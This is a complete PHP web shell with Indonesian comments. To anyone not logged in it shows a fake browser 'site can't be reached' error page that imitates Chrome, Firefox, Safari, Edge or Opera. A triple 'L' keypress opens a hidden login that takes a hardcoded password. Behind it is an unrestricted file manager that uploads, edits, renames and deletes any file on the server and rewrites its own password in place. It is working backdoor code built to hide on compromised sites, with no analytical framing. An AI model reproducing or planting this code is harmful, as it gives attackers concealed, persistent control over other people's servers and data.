<?php
session_start();


function getScriptContent() {
    return file_get_contents(__FILE__);
}


function saveScriptContent($content) {
    file_put_contents(__FILE__, $content);
}

// Password yang benar (ubah sesuai keinginan Anda)
$correct_password = "kontolodon138";


function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}


function handleLogin($password) {
    global $correct_password;
    if ($password === $correct_password) {
        $_SESSION['loggedin'] = true;
        return true;
    }
    return false;
}


function changePassword($new_password) {
    global $correct_password;
    $script_content = getScriptContent();
    $new_script_content = preg_replace(
        '/(\$correct_password\s*=\s*\")[^\"]+(\")/',
        '$1' . addslashes($new_password) . '$2',
        $script_content
    );
    saveScriptContent($new_script_content);
    $_SESSION['correct_password'] = $new_password;
    $correct_password = $new_password;
}


function createFolder($folder_name, $path) {
    $target_dir = rtrim($path, '/') . '/' . $folder_name;
    if (!is_dir($target_dir)) {
        return mkdir($target_dir);
    }
    return false;
}


function uploadFile($file, $path) {
    $target_file = rtrim($path, '/') . '/' . basename($file["name"]);
    return move_uploaded_file($file["tmp_name"], $target_file);
}


function deleteFile($file_path) {
    if (is_file($file_path)) {
        return unlink($file_path);
    }
    return false;
}


function deleteDir($dir_path) {
    if (!is_dir($dir_path)) {
        return false;
    }
    $items = array_diff(scandir($dir_path), ['.', '..']);
    foreach ($items as $item) {
        $full_path = "$dir_path/$item";
        is_dir($full_path) ? deleteDir($full_path) : unlink($full_path);
    }
    return rmdir($dir_path);
}


function createFile($file_name, $path) {
    $target_file = rtrim($path, '/') . '/' . $file_name;
    if (!file_exists($target_file)) {
        return touch($target_file);
    }
    return false;
}


function detectBrowser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    
    if (strpos($user_agent, 'Chrome') !== false) return 'chrome';
    if (strpos($user_agent, 'Firefox') !== false) return 'firefox';
    if (strpos($user_agent, 'Safari') !== false) return 'safari';
    if (strpos($user_agent, 'Edge') !== false) return 'edge';
    if (strpos($user_agent, 'Opera') !== false) return 'opera';
    
    return 'default';
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !isLoggedIn()) {
    if (handleLogin($_POST['password'])) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $login_error = "Password salah!";
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_password']) && isLoggedIn()) {
    $new_password = $_POST['new_password'];
    changePassword($new_password);
    $password_change_success = "Password berhasil diganti!";
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_folder']) && isLoggedIn()) {
    $folder_name = $_POST['folder_name'];
    $current_path = $_POST['current_path'];
    if (createFolder($folder_name, $current_path)) {
        $folder_create_success = "Folder berhasil dibuat.";
    } else {
        $folder_create_error = "Gagal membuat folder.";
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit']) && isLoggedIn()) {
    $current_path = $_POST['current_path'];
    if (uploadFile($_FILES["file"], $current_path)) {
        $file_upload_success = "File berhasil diunggah.";
    } else {
        $file_upload_error = "Gagal mengunggah file.";
    }
}


if (isset($_GET['delete']) && isLoggedIn()) {
    $path_to_delete = $_GET['delete'];
    if (is_dir($path_to_delete)) {
        if (deleteDir($path_to_delete)) {
            $delete_success = "Direktori berhasil dihapus.";
        } else {
            $delete_error = "Gagal menghapus direktori.";
        }
    } else {
        if (deleteFile($path_to_delete)) {
            $delete_success = "File berhasil dihapus.";
        } else {
            $delete_error = "Gagal menghapus file.";
        }
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file']) && isLoggedIn()) {
    $file_name = $_POST['file_name'];
    $current_path = $_POST['current_path'];
    if (createFile($file_name, $current_path)) {
        $file_create_success = "File berhasil dibuat.";
    } else {
        $file_create_error = "Gagal membuat file.";
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name']) && isset($_POST['old_name']) && isLoggedIn()) {
    $old_name = $_POST['old_name'];
    $new_name = $_POST['new_name'];
    if (rename($old_name, dirname($old_name) . '/' . $new_name)) {
        $rename_success = "Berhasil mengubah nama.";
    } else {
        $rename_error = "Gagal mengubah nama.";
    }
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content']) && isset($_POST['file_to_edit']) && isLoggedIn()) {
    $file_to_edit = $_POST['file_to_edit'];
    $new_content = $_POST['file_content'];
    if (file_put_contents($file_to_edit, $new_content) !== false) {
        $file_edit_success = "Berhasil menyimpan perubahan.";
    } else {
        $file_edit_error = "Gagal menyimpan perubahan.";
    }
}


if (!isLoggedIn()) {
    $browser = detectBrowser();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>This site can't be reached</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                font-family: system-ui, -apple-system, sans-serif;
                background: #fff;
                color: #1f1f1f;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                text-align: left;
            }
            .error-container {
                max-width: 600px;
                padding: 20px;
            }
            .icon {
                font-size: 48px;
                margin-bottom: 20px;
            }
            .error-title {
                font-size: 28px;
                font-weight: 400;
                margin: 0 0 20px 0;
                line-height: 1.3;
            }
            .error-message {
                font-size: 15px;
                margin: 0 0 25px 0;
                line-height: 1.5;
                color: #5f6368;
            }
            .suggestions {
                font-size: 14px;
                margin: 25px 0;
                padding-left: 20px;
                color: #5f6368;
            }
            .suggestions li {
                margin-bottom: 10px;
                line-height: 1.4;
            }
            .buttons {
                margin-top: 25px;
            }
            .reload-button {
                background: #1a73e8;
                color: white;
                border: none;
                padding: 10px 24px;
                border-radius: 4px;
                font-size: 14px;
                cursor: pointer;
                margin-right: 10px;
            }
            .details-button {
                background: transparent;
                color: #1a73e8;
                border: 1px solid #dadce0;
                padding: 9px 23px;
                border-radius: 4px;
                font-size: 14px;
                cursor: pointer;
            }
            .login-modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background-color: rgba(0,0,0,0.8);
                z-index: 999;
                justify-content: center;
                align-items: center;
            }
            .login-box {
                background-color: #0b0b0b;
                padding: 30px;
                border: 1px solid #00ff00;
                border-radius: 8px;
                box-shadow: 0 0 15px #00ff00;
                width: 320px;
            }
            .login-box h2 {
                color: #00ff00;
                text-align: center;
                margin-bottom: 20px;
            }
            input[type="password"], input[type="submit"] {
                display: block;
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background-color: #0b0b0b;
                border: 1px solid #00ff00;
                color: #00ff00;
                font-family: 'Courier New', Courier, monospace;
                border-radius: 4px;
                box-sizing: border-box;
            }
            input[type="submit"] {
                cursor: pointer;
                background-color: #00ff00;
                color: #0b0b0b;
                font-weight: bold;
                border: none;
                transition: background-color 0.3s;
            }
            input[type="submit"]:hover {
                background-color: #00cc00;
            }
            .error {
                color: #ff4444;
                text-align: center;
                margin: 10px 0;
                font-size: 14px;
            }
            .close-btn {
                color: #00ff00;
                float: right;
                font-size: 24px;
                cursor: pointer;
                background: none;
                border: none;
                line-height: 1;
            }
            
            /* Chrome/Edge Style */
            .chrome .icon { color: #ea4335; }
            .chrome .error-title { color: #1f1f1f; }
            
            /* Firefox Style */
            .firefox .icon { color: #ff9500; }
            .firefox .error-title { color: #20123a; }
            .firefox body { background: #f9f9fb; }
            
            /* Safari Style */
            .safari .icon { color: #1d9bf0; }
            .safari .error-title { color: #1d1d1f; }
            .safari body { background: #fbfbfd; }
            
            /* Edge Style */
            .edge .icon { color: #0078d7; }
            .edge .error-title { color: #323130; }
            
            /* Opera Style */
            .opera .icon { color: #ff1b2d; }
            .opera .error-title { color: #1a1a1a; }
            .opera body { background: #f9f9f9; }
            
            /* Default Style */
            .default .icon { color: #666; }
            .default .error-title { color: #333; }
        </style>
    </head>
    <body class="<?php echo $browser; ?>">
        <!-- Modal login yang disembunyikan -->
        <div id="loginModal" class="login-modal">
            <div class="login-box">
                <button class="close-btn" onclick="hideLogin()">&times;</button>
                <h2>Admin Login</h2>
                <?php if (isset($login_error)): ?>
                    <p class="error"><?php echo htmlspecialchars($login_error); ?></p>
                <?php endif; ?>
                <form method="post" action="">
                    <input type="password" name="password" placeholder="Enter Password" required>
                    <input type="submit" value="Login">
                </form>
            </div>
        </div>

        <!-- Konten halaman error sesuai browser -->
        <div class="error-container">
            <div class="icon">
                <?php if ($browser == 'chrome'): ?>
                    &#9888;&#65039; <!-- Warning emoji -->
                <?php elseif ($browser == 'firefox'): ?>
                    &#128683; <!-- Prohibited emoji -->
                <?php elseif ($browser == 'safari'): ?>
                    &#128721; <!-- Shield emoji -->
                <?php elseif ($browser == 'edge'): ?>
                    &#128680; <!-- Stop sign emoji -->
                <?php elseif ($browser == 'opera'): ?>
                    &#9888;&#65039; <!-- Warning emoji -->
                <?php else: ?>
                    &#128721; <!-- Default shield emoji -->
                <?php endif; ?>
            </div>
            
            <?php if ($browser == 'chrome'): ?>
                <h1 class="error-title">This site can't be reached</h1>
                <p class="error-message">
                    <strong>www.example.com</strong> took too long to respond.<br>
                    Try:
                </p>
                <ul class="suggestions">
                    <li>Checking the connection</li>
                    <li>Checking the proxy and the firewall</li>
                    <li>Running Windows Network Diagnostics</li>
                </ul>
                <div class="buttons">
                    <button class="reload-button" onclick="window.location.reload()">Reload</button>
                    <button class="details-button">Details</button>
                </div>

            <?php elseif ($browser == 'firefox'): ?>
                <h1 class="error-title">Unable to connect</h1>
                <p class="error-message">
                    Firefox can't establish a connection to the server at <strong>www.example.com</strong>.
                </p>
                <ul class="suggestions">
                    <li>The site could be temporarily unavailable or too busy. Try again in a few moments.</li>
                    <li>If you are unable to load any pages, check your computer's network connection.</li>
                    <li>If your computer or network is protected by a firewall or proxy, make sure that Firefox is permitted to access the Web.</li>
                </ul>
                <div class="buttons">
                    <button class="reload-button" onclick="window.location.reload()">Try Again</button>
                </div>

            <?php elseif ($browser == 'safari'): ?>
                <h1 class="error-title">Safari can't open the page</h1>
                <p class="error-message">
                    Safari can't open the page "https://www.example.com" because the server where this page is located isn't responding.
                </p>
                <ul class="suggestions">
                    <li>The site could be temporarily unavailable or too busy. Try again in a few moments.</li>
                    <li>If you can't open any pages, check your computer's network connection.</li>
                </ul>
                <div class="buttons">
                    <button class="reload-button" onclick="window.location.reload()">Reload This Page</button>
                </div>

            <?php elseif ($browser == 'edge'): ?>
                <h1 class="error-title">This page isn't working</h1>
                <p class="error-message">
                    <strong>www.example.com</strong> didn't send any data.<br>
                    ERR_EMPTY_RESPONSE
                </p>
                <ul class="suggestions">
                    <li>Try reloading the page</li>
                    <li>Check your internet connection</li>
                    <li>Check that the address is correct</li>
                </ul>
                <div class="buttons">
                    <button class="reload-button" onclick="window.location.reload()">Reload</button>
                </div>

            <?php elseif ($browser == 'opera'): ?>
                <h1 class="error-title">This page isn't working</h1>
                <p class="error-message">
                    <strong>www.example.com</strong> didn't send any data.
                </p>
                <ul class="suggestions">
                    <li>Try reloading the page</li>
                    <li>Check your internet connection</li>
                    <li>Check that the address is correct</li>
                </ul>
                <div class="buttons">
                    <button class="reload-button" onclick="window.location.reload()">Reload</button>
                </div>

            <?php else: ?>
                <h1 class="error-title">This page isn't working</h1>
                <p class="error-message">
                    <strong>www.example.com</strong> didn't send any data.<br>
                    ERR_EMPTY_RESPONSE
                </p>
                <ul class="suggestions">
                    <li>Try reloading the page</li>
                    <li>Check your internet connection</li>
                    <li>Check that the address is correct</li>
                </ul>
                <div class="buttons">
                    <button class="reload-button" onclick="window.location.reload()">Reload</button>
                </div>
            <?php endif; ?>
        </div>

        <script>
            let lCount = 0;
            let lTimer = null;
            
            function showLogin() {
                document.getElementById('loginModal').style.display = 'flex';
                lCount = 0;
            }
            
            function hideLogin() {
                document.getElementById('loginModal').style.display = 'none';
                lCount = 0;
            }
            

            document.addEventListener('keydown', function(event) {
                if (event.key === 'L' || event.key === 'l') {
                    if (lTimer) {
                        clearTimeout(lTimer);
                    }
                    
                    lCount++;
                    
                    if (lCount === 3) {
                        showLogin();
                    }
                    
                    lTimer = setTimeout(function() {
                        lCount = 0;
                    }, 1500);
                }
                
                if (event.key === 'Escape') {
                    hideLogin();
                }
            });
            
            window.onclick = function(event) {
                const modal = document.getElementById('loginModal');
                if (event.target === modal) {
                    hideLogin();
                }
            }

            // Fake details button for Chrome
            document.querySelector('.details-button')?.addEventListener('click', function() {
                alert('Unable to connect to the server. Error code: ERR_EMPTY_RESPONSE');
            });
        </script>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan form untuk mengganti password jika parameter URL 'change_password' ada
if (isset($_GET['change_password']) && isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Change Password</title>
    </head>
    <body>
        <h2>Change Password</h2>
        <?php if (isset($password_change_success)): ?>
            <p><?php echo htmlspecialchars($password_change_success); ?></p>
        <?php elseif (isset($password_change_error)): ?>
            <p><?php echo htmlspecialchars($password_change_error); ?></p>
        <?php endif; ?>
        <form method="post" action="">
            <input type="password" name="new_password" placeholder="Enter New Password" required>
            <input type="submit" value="Change Password">
        </form>
    </body>
    </html>
    <?php
    exit();
}


if (isset($_GET['rename']) && isLoggedIn()) {
    $old_name = $_GET['rename'];
    $is_directory = is_dir($old_name);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Rename <?php echo $is_directory ? 'Directory' : 'File'; ?></title>
    </head>
    <body>
        <h2>Rename <?php echo $is_directory ? 'Directory' : 'File'; ?></h2>
        <form method="post" action="">
            <input type="text" name="new_name" placeholder="Enter New Name" required>
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($old_name); ?>">
            <input type="submit" value="Rename">
        </form>
    </body>
    </html>
    <?php
    exit();
}


if (isset($_GET['edit_file']) && isLoggedIn()) {
    $file_to_edit = $_GET['edit_file'];
    if (is_file($file_to_edit)) {
        $file_content = file_get_contents($file_to_edit);
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Edit File</title>
        </head>
        <body>
            <h2>Edit File</h2>
            <form method="post" action="">
                <textarea name="file_content" rows="20" cols="100"><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="file_to_edit" value="<?php echo htmlspecialchars($file_to_edit); ?>">
                <input type="submit" value="Save Changes">
            </form>
        </body>
        </html>
        <?php
        exit();
    }
}


if (isset($_GET['create_folder']) && isLoggedIn()) {
    $current_path = $_GET['path'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Create Folder</title>
    </head>
    <body>
        <h2>Create Folder</h2>
        <form method="post" action="">
            <input type="text" name="folder_name" placeholder="Folder Name" required>
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
            <input type="submit" name="create_folder" value="Create Folder">
        </form>
    </body>
    </html>
    <?php
    exit();
}


if (isset($_GET['upload_file']) && isLoggedIn()) {
    $current_path = $_GET['path'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Upload File</title>
    </head>
    <body>
        <h2>Upload File</h2>
        <form method="post" enctype="multipart/form-data" action="">
            <input type="file" name="file" required>
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
            <input type="submit" name="submit" value="Upload">
        </form>
    </body>
    </html>
    <?php
    exit();
}


if (isset($_GET['create_file']) && isLoggedIn()) {
    $current_path = $_GET['path'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Create File</title>
    </head>
    <body>
        <h2>Create File</h2>
        <form method="post" action="">
            <input type="text" name="file_name" placeholder="File Name" required>
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
            <input type="submit" name="create_file" value="Create File">
        </form>
    </body>
    </html>
    <?php
    exit();
}


$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);


$paths = explode(DIRECTORY_SEPARATOR, realpath($path));

// Menampilkan tautan logout dan ganti password
echo "<a href='?logout'>Logout</a> | ";
echo "<a href='?change_password'><button>Ganti Password</button></a> | ";
echo "<a href='?create_folder&path=$path'><button>Create Folder</button></a> | ";
echo "<a href='?create_file&path=$path'><button>Create File</button></a> | ";
echo "<a href='?upload_file&path=$path'><button>Upload File</button></a>";
echo "<hr>";


echo "<h2>Current Path:</h2>";
echo "<p>";
foreach ($paths as $i => $p) {
    if ($i > 0) {
        echo "/";
    }
    echo "<a href='" . $_SERVER['PHP_SELF'] . "?path=";
    for ($j = 0; $j <= $i; $j++) {
        if ($j > 0) {
            echo "/";
        }
        echo $paths[$j];
    }
    echo "'>$p</a>";
}
echo "</p>";


echo "<h2>Directory Listing:</h2>";
$items = scandir(getcwd());

echo "<ul>";
foreach ($items as $item) {
    if ($item === "." || $item === "..") {
        continue;
    }
    $full_path = realpath($item);
    if (is_dir($full_path)) {
        echo "<li>[DIR] <a href='" . $_SERVER['PHP_SELF'] . "?path=$full_path'>$item</a></li>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?rename=$full_path'>Rename</a>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?delete=$full_path'>Delete</a>";
    } else {
        echo "<li>[FILE] <a href='" . $_SERVER['PHP_SELF'] . "?edit_file=$full_path'>$item</a></li>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?rename=$full_path'>Rename</a>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?delete=$full_path'>Delete</a>";
    }
}
echo "</ul>";


function displayOperationResult($success, $error) {
    if ($success) {
        echo "<p>$success</p>";
    }
    if ($error) {
        echo "<p>$error</p>";
    }
}

displayOperationResult($rename_success ?? null, $rename_error ?? null);
displayOperationResult($file_edit_success ?? null, $file_edit_error ?? null);
displayOperationResult($delete_success ?? null, $delete_error ?? null);
displayOperationResult($file_create_success ?? null, $file_create_error ?? null);
displayOperationResult($folder_create_success ?? null, $folder_create_error ?? null);
displayOperationResult($file_upload_success ?? null, $file_upload_error ?? null);
?>